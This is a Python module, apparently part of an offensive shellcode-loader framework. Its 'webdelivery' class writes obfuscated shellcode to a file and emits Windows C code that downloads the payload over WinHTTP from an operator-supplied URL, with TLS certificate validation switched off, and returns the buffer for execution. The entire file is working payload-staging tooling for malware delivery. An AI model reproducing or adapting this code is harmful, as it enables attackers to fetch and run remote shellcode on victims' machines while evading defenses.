import random
import string
from c.utils.formatters import *
from urllib.parse import urlsplit

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        shellcodetype = type(shellcode).__name__
        if shellcodetype == 'bytes':
            self.type = 'const unsigned char *'
            open(outfile, 'wb').write(shellcode)
        elif shellcodetype == 'str':
            self.type = 'const unsigned char *'
            open(outfile, 'w').write(shellcode)
        elif shellcodetype == 'list':
            self.type = 'const unsigned char **'
            open(outfile, 'w').write('\n'.join(shellcode))
            self.listLength = len(shellcode)
        print(f'Writing obfuscated shellcode to {outfile}')
        if 'url' not in arguments:
            print('No url specified')
            exit(0)
        spliturl = urlsplit(arguments['url'])
        self.hostname = spliturl.hostname
        if spliturl.scheme not in ['http', 'https']:
            self.scheme = 'https'
        else:
            self.scheme = spliturl.scheme
        self.path = spliturl.path
        self.query = spliturl.query
        if spliturl.port:
            self.port = spliturl.port
        else:
            self.port='INTERNET_DEFAULT_PORT'
        if self.scheme == 'https':
            self.flags = 'WINHTTP_FLAG_SECURE'
        else:
            self.flags = 0

    def imports(self) -> list[str]:
        return ['#include <winhttp.h>', 
                '#pragma comment(lib, "winhttp.lib")']

    def compilerOptions(self) -> list[str]:
        return ['-lwinhttp']

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:
        codeblock = f"""
{self.type} {self.name}()
{{
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen( L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
    hConnect = WinHttpConnect( hSession, L"{self.hostname}", {self.port}, 0 );
    hRequest = WinHttpOpenRequest(hConnect,L"GET", L"{self.path}", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, {self.flags});

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    bResults = WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
    bResults = WinHttpReceiveResponse(hRequest, NULL);

    unsigned char *obfuscated = NULL;
    int obfuscatedLength = 0;

    if( bResults )
    {{
        do 
        {{
            // Check for available data.
            dwSize = 0;
            if( !WinHttpQueryDataAvailable( hRequest, &dwSize ) )
            printf( "Error %u in WinHttpQueryDataAvailable.\\n",
                    GetLastError( ) );

            // Allocate space for the buffer.
            unsigned char *obfuscatedTemp = realloc(obfuscated, obfuscatedLength + dwSize + 1);
            obfuscated = obfuscatedTemp;
            WinHttpReadData( hRequest, (LPVOID)(obfuscated + obfuscatedLength), dwSize, &dwDownloaded );
            obfuscatedLength += dwSize;
        }} while( dwSize > 0 );
    }}
    obfuscated[obfuscatedLength] = '\\0';
"""

        if self.type == 'const unsigned char **':
            codeblock += f"""
    unsigned char **array = malloc(sizeof(unsigned char *) * {self.listLength});
    char* token = strtok(obfuscated, "\\n");
    int i = 0;
    while (token != NULL) {{
        // Resize array if capacity is reached
        array[i] = strdup(token);
        i+=1;
        token = strtok(NULL, "\\n");
    }}

    return (const unsigned char **)array;
}}

""" 
        else:
            codeblock += f"""
    return obfuscated;
}}

"""
        return codeblock
